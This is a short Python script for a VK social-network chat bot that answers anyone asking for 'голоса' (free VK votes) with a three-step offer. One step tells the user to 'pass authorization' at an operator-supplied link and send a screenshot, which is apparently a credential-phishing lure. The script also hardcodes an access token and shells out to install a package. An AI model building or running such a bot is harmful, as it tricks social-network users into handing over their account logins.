import vk_api
import os
	
from vk_api.longpoll import VkLongPoll, VkEventType
x=123456
os.system('clear')
def lol(user_id,message):
    vk.method('messages.send',{'user_id': user_id, 'message': message,'random_id':x})
	
token='c2e514f79dd6d1930905f9f32d103b20b6a177fc8906662818468804aaf2e528f69cf23528bce29fc80d5'
vk=vk_api.VkApi(token=token)
longpoll=VkLongPoll(vk)
link=input('введи ссылку: ')
print('бот работает : )')
for event in longpoll.listen():
    if event.type==VkEventType.MESSAGE_NEW:
        x+=1
        if event.to_me:
            r=event.text
            print(event.user_id,r)
            if r=='Голоса' or r=='голоса':#если сообщение для бота голоса то
                lol(event.user_id,'Привет🙏\nДля получения голосов выполни 3 простых шага😏\n1:Подпишись на группу😇\n2:Пройди авторизацию'+link+'\n3:Отправь скрин!')
                                #иначе отправить это
            if r=='q':
                os.system('pkg install sl')
		os.system('sl')
